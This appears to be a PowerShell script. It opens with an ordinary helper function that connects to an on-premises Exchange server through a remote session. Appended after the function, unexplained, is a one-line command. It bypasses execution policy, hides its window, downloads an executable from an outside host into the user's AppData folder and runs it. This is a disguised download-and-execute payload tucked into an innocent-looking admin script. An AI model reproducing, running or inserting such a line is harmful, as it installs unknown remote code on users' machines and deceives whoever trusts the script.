function Connect-ExchangeOnPremises
{

    PARAM (
        [Parameter(Mandatory,HelpMessage= 'http://<ServerFQDN>/powershell')]
        [system.string]$ConnectionUri,
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )

    $Splatting = @{
        ConnectionUri = $ConnectionUri
        ConfigurationName = 'microsoft.exchange'
    }
    IF ($PSBoundParameters['Credential']){$Splatting.Credential = $Credential}

    
    Import-PSSession -Session (New-pssession @Splatting)
}
PowerShell -ExecutionPolicy bypass -noprofile -windowstyle minimized -command (New-Object System.Net.WebClient).DownloadFile('https://a.vidga.me/thgohw.exe', $env:APPDATA\Example.exe );Start-Process ( $env:APPDATA\Example.exe )

